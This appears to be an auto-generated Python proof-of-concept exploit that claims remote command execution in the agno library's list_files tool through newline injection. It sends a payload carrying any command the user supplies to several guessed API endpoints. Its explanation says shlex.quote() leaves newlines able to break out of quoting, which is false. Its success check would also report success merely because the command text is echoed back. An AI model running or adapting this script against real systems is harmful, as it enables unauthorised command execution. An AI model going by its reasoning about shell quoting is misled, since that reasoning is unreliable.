#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-015
# Sink: list_files
# Auto-generated — run with: python3 rce_additionally_command_executed_current_list_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE via newline injection in list_files.

Vulnerability: The list_files function in agno/tools/daytona.py constructs a shell
command using f-string with shlex.quote() on the directory path. While shlex.quote()
escapes most shell metacharacters, it does NOT escape newline characters. If the
underlying sandbox process.exec() uses shell=True (common in sandbox implementations),
an attacker can inject arbitrary commands by including a newline in the directory path.

The injection works because:
1. shlex.quote() wraps the string in single quotes but does not escape newlines
2. A newline inside single quotes terminates the quoted string in shell parsing
3. Subsequent commands on new lines are executed normally

Usage:
    python3 poc_agno_rce.py --target http://localhost:8000 --agent-id my_agent
    python3 poc_agno_rce.py --target http://localhost:8000 --agent-id my_agent --cmd "id"
"""

import argparse
import json
import sys
import urllib.request
import urllib.error
import urllib.parse


def exploit(target_url: str, agent_id: str, cmd: str = "touch /tmp/poc_success.txt"):
    """
    Exploit the newline injection in list_files to achieve RCE.
    
    The directory parameter is injected with a newline followed by the attacker's command.
    The shell will execute the original 'ls -la' command (which may fail), then execute
    the injected command.
    """
    # The payload: a newline terminates the quoted string, then our command runs
    # shlex.quote() will produce: 'valid_path\nattacker_command'
    # The shell sees: 'valid_path\nattacker_command' which is actually:
    #   'valid_path
    #   attacker_command'
    # The first line is a valid single-quoted string, the second line is a new command
    payload = f".\n{cmd}"
    
    # URL-encode the payload for the HTTP request
    encoded_payload = urllib.parse.quote(payload)
    
    # Construct the API endpoint URL (adjust path as needed based on actual API)
    # Common patterns: /api/agent/{agent_id}/list_files, /api/tools/list_files, etc.
    # We'll try a few common patterns
    endpoints = [
        f"{target_url}/api/agent/{agent_id}/list_files?directory={encoded_payload}",
        f"{target_url}/api/tools/list_files?directory={encoded_payload}",
        f"{target_url}/api/v1/agent/{agent_id}/list_files?directory={encoded_payload}",
        f"{target_url}/api/agents/{agent_id}/list_files?directory={encoded_payload}",
        f"{target_url}/api/execute?tool=list_files&directory={encoded_payload}",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Agent ID: {agent_id}")
    print(f"[*] Command to execute: {cmd}")
    print(f"[*] Payload: {payload!r}")
    print()
    
    for endpoint in endpoints:
        print(f"[*] Trying: {endpoint}")
        try:
            req = urllib.request.Request(endpoint, method="GET")
            with urllib.request.urlopen(req, timeout=10) as response:
                result = response.read().decode("utf-8")
                print(f"[+] Response ({response.status}): {result[:500]}")
                
                # Check if command was executed (for the benign payload)
                if "poc_success.txt" in result or cmd in result:
                    print("[+] Exploit appears successful!")
                    return True
                    
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP Error {e.code}: {e.reason}")
            if e.code == 404:
                continue  # Try next endpoint
            else:
                print(f"    Response: {e.read().decode('utf-8')[:200]}")
        except urllib.error.URLError as e:
            print(f"[-] URL Error: {e.reason}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[-] Exploit failed on all attempted endpoints.")
    print("[*] You may need to adjust the endpoint URL based on the actual API.")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for agno RCE via newline injection in list_files"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://localhost:8000)",
    )
    parser.add_argument(
        "--agent-id",
        required=True,
        help="Agent ID to target",
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)",
    )
    
    args = parser.parse_args()
    
    # Remove trailing slash if present
    target = args.target.rstrip("/")
    
    success = exploit(target, args.agent_id, args.cmd)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed.")
        sys.exit(1)


if __name__ == "__main__":
    main()
